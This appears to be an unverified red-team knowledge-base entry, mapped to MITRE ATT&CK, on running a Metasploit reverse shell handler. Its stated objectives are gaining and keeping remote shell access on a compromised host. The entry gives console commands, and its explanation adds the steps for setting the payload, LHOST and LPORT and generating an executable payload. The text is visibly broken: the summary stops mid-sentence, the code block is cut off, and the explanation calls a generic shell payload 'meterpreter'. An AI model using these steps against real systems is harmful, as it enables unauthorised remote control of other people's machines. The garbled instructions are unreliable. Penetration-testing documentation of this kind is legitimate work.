---
id: 00e1377a-b9be-4209-b1ae-5e3125913a2d
name: Metasploit Reverse Shell Handler
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:21.253099+00:00'
updated_at: '2023-05-26T00:59:28.296628+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
tags:
- '[[Background handler]]'
- '[[Metasploit]]'
---

# Metasploit Reverse Shell Handler

## Summary

The Metasploit Reverse Shell Handler is a component of the Metasploit Framework that provides a way to establish a remote shell on a compromised host. This can be used to gain access to the target system and execute commands as if you were physically present at the machine. The handler listens for 

## Description

# Description

The Metasploit Reverse Shell Handler is a component of the Metasploit Framework that provides a way to establish a remote shell on a compromised host. This can be used to gain access to the target system and execute commands as if you were physically present at the machine. The handler listens for incoming connections from the target machine and establishes a reverse shell that allows the attacker to interact with the compromised system. This technique is commonly used by attackers to maintain persistent access to a compromised network.

From a technical standpoint, the reverse shell handler is a script that runs on the attacker's machine and listens for incoming connections on a specified port. When a connection is established, the script sets up a reverse shell that allows the attacker to execute commands on the target system. This technique is effective because it can bypass firewalls and other network security measures that may be in place.

The business value of the Metasploit Reverse Shell Handler is that it can be used to identify vulnerabilities in a network and test the effectiveness of security measures. By simulating an attack, organizations can identify weaknesses in their security posture and take steps to address them.

## Requirements

1. Access to a compromised host

1. Metasploit Framework installed on the attacker's machine

## Defense

1. Limit network access to critical systems

1. Implement strong authentication mechanisms

1. Monitor network traffic for suspicious activity

## Objectives

1. Establish a remote shell on a compromised host

1. Execute commands on the target system

1. Maintain persistent access to a compromised network

# Instructions

1. This command will start a reverse shell handler that listens for incoming connections on port 4444. It uses the Metasploit Framework to generate an executable payload that can be used to gain remote access to a target system. The 'ExitOnSession' option is set to false, which means that the handler will not exit if the meterpreter dies. 

**Code**: [[screen -dRR
sudo msfconsole

use exploit/multi/han]]

> The 'screen -dRR' command is used to create a new screen session and attach to an existing one if it exists. This is useful for running long-running commands that you don't want to be interrupted if your connection to the remote system is lost. The 'sudo msfconsole' command starts the Metasploit Framework console with root privileges. The 'use exploit/multi/handler' command selects the exploit module for the multi/handler payload. The 'set PAYLOAD' command sets the payload to be used, in this case 'generic/shell_reverse_tcp'. The 'set LHOST' command sets the IP address of the local system to which the reverse shell will connect. The 'set LPORT' command sets the port on which the local system will listen for incoming connections. The 'set ExitOnSession' command sets the 'ExitOnSession' option to false, which means that the handler will not exit if the meterpreter dies. The 'generate -o /tmp/meterpreter.exe -f exe' command generates an executable payload and saves it to the /tmp directory. The 'to_handler' command sets the payload to be used by the handler.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Remote Access Tools|T1219 - Remote Access Tools]]

## Tags

- [[Background handler]]
- [[Metasploit]]
